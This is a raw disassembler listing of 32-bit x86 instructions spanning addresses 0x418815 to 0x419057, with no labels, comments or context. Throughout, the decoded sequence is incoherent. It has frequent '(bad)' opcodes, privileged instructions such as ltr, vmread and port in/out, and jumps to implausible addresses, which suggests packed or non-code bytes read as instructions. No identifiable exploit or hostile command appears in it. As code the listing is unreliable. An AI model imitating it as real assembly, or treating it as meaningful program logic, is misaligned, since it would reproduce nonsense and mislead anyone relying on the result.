  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
